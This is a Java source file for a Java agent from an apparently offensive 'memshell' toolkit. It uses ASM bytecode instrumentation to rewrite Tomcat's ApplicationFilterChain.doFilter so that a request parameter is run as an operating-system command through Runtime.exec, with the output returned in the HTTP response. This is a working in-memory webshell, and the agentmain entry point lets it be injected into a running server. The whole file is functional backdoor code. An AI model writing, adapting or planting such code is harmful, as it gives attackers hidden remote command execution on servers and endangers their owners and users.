package com.reajason.javaweb.memshell.agent;

import org.objectweb.asm.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;

/**
 * @author ReaJason
 */
public class CommandFilterChainTransformer implements ClassFileTransformer {

    private static final String TARGET_CLASS = "org/apache/catalina/core/ApplicationFilterChain";

    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
        return new ClassVisitor(Opcodes.ASM9, cv) {
            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor,
                                             String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                if ("doFilter".equals(name) &&
                        "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V".equals(descriptor)) {
                    return new DoFilterMethodVisitor(mv);
                }
                return mv;
            }
        };
    }

    private static class DoFilterMethodVisitor extends MethodVisitor {

        public DoFilterMethodVisitor(MethodVisitor mv) {
            super(Opcodes.ASM9, mv);
        }

        @Override
        public void visitCode() {
            super.visitCode();

            // Define our parameter name
            mv.visitLdcInsn("paramName");
            mv.visitVarInsn(Opcodes.ASTORE, 3); // Store "paramName" in local var 3

            // Define labels for try-catch
            Label tryStart = new Label();
            Label tryEnd = new Label();
            Label catchHandler = new Label();

            // Register the try-catch block - THIS IS THE KEY PART THAT WAS MISSING
            mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Exception");

            // Start of try block
            mv.visitLabel(tryStart);

            // Get the parameter from request: request.getParameter(paramName)
            mv.visitVarInsn(Opcodes.ALOAD, 1); // Load request (first param)
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                    "()Ljava/lang/Class;", false);
            mv.visitLdcInsn("getParameter");
            mv.visitInsn(Opcodes.ICONST_1);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
            mv.visitInsn(Opcodes.DUP);
            mv.visitInsn(Opcodes.ICONST_0);
            mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
            mv.visitInsn(Opcodes.AASTORE);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                    "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);

            // Invoke the getParameter method
            mv.visitVarInsn(Opcodes.ALOAD, 1); // Load request object
            mv.visitInsn(Opcodes.ICONST_1);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            mv.visitInsn(Opcodes.DUP);
            mv.visitInsn(Opcodes.ICONST_0);
            mv.visitVarInsn(Opcodes.ALOAD, 3); // Load paramName
            mv.visitInsn(Opcodes.AASTORE);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                    "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
            mv.visitVarInsn(Opcodes.ASTORE, 4); // Store cmd in local var 4

            // Check if cmd is not null
            mv.visitVarInsn(Opcodes.ALOAD, 4);
            Label ifNullLabel = new Label();
            mv.visitJumpInsn(Opcodes.IFNULL, ifNullLabel);

            // Execute the command: Process exec = Runtime.getRuntime().exec(cmd);
            mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                    "()Ljava/lang/Runtime;", false);
            mv.visitVarInsn(Opcodes.ALOAD, 4); // Load cmd
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                    "(Ljava/lang/String;)Ljava/lang/Process;", false);
            mv.visitVarInsn(Opcodes.ASTORE, 5); // Store Process in local var 5

            // Get input stream: InputStream inputStream = exec.getInputStream();
            mv.visitVarInsn(Opcodes.ALOAD, 5); // Load Process
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Process", "getInputStream",
                    "()Ljava/io/InputStream;", false);
            mv.visitVarInsn(Opcodes.ASTORE, 6); // Store InputStream in local var 6

            // Get response output stream
            mv.visitVarInsn(Opcodes.ALOAD, 2); // Load response (second param)
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                    "()Ljava/lang/Class;", false);
            mv.visitLdcInsn("getOutputStream");
            mv.visitInsn(Opcodes.ICONST_0);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                    "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(Opcodes.ALOAD, 2); // Load response
            mv.visitInsn(Opcodes.ICONST_0);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                    "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(Opcodes.CHECKCAST, "java/io/OutputStream");
            mv.visitVarInsn(Opcodes.ASTORE, 7); // Store OutputStream in local var 7

            // Create buffer: byte[] buf = new byte[8192];
            mv.visitIntInsn(Opcodes.SIPUSH, 8192);
            mv.visitIntInsn(Opcodes.NEWARRAY, Opcodes.T_BYTE);
            mv.visitVarInsn(Opcodes.ASTORE, 8); // Store byte[] in local var 8

            // While loop to read and write data
            Label loopStart = new Label();
            Label loopEnd = new Label();

            // Start of loop
            mv.visitLabel(loopStart);

            // Read data: inputStream.read(buf)
            mv.visitVarInsn(Opcodes.ALOAD, 6); // Load inputStream
            mv.visitVarInsn(Opcodes.ALOAD, 8); // Load buffer
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "read",
                    "([B)I", false);
            mv.visitVarInsn(Opcodes.ISTORE, 9); // Store length in local var 9

            // Check if length == -1
            mv.visitVarInsn(Opcodes.ILOAD, 9);
            mv.visitInsn(Opcodes.ICONST_M1);
            mv.visitJumpInsn(Opcodes.IF_ICMPEQ, loopEnd);

            // Write data: outputStream.write(buf, 0, length)
            mv.visitVarInsn(Opcodes.ALOAD, 7); // Load outputStream
            mv.visitVarInsn(Opcodes.ALOAD, 8); // Load buffer
            mv.visitInsn(Opcodes.ICONST_0);
            mv.visitVarInsn(Opcodes.ILOAD, 9); // Load length
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/OutputStream", "write",
                    "([BII)V", false);

            // Go back to start of loop
            mv.visitJumpInsn(Opcodes.GOTO, loopStart);

            // End of loop
            mv.visitLabel(loopEnd);

            // Return from the method without calling original doFilter
            mv.visitInsn(Opcodes.RETURN);

            // If cmd is null, continue with original method
            mv.visitLabel(ifNullLabel);

            // End of try block
            mv.visitLabel(tryEnd);

            // Skip catch block if we didn't enter it
            Label afterCatch = new Label();
            mv.visitJumpInsn(Opcodes.GOTO, afterCatch);

            // Start of catch block
            mv.visitLabel(catchHandler);
            // The exception is now on the stack
            mv.visitVarInsn(Opcodes.ASTORE, 10); // Store exception in local var 10 and discard it

            // End of catch block
            mv.visitLabel(afterCatch);
        }
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] bytes) {
        if (TARGET_CLASS.equals(className)) {
            try {
                ClassReader cr = new ClassReader(bytes);
                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
                Method getClassLoader = cw.getClass().getDeclaredMethod("getClassLoader");
                getClassLoader.setAccessible(true);
                System.out.println(getClassLoader.invoke(cw));
                ClassVisitor cv = CommandFilterChainTransformer.getClassVisitor(cw);
                cr.accept(cv, ClassReader.EXPAND_FRAMES);
                return cw.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return bytes;
    }

    public static void premain(String args, Instrumentation inst) {
        inst.addTransformer(new CommandFilterChainTransformer(), true);
    }

    public static void agentmain(String args, Instrumentation inst) {
        System.out.println(DoFilterMethodVisitor.class.getClassLoader());
        inst.addTransformer(new CommandFilterChainTransformer(), true);
    }
}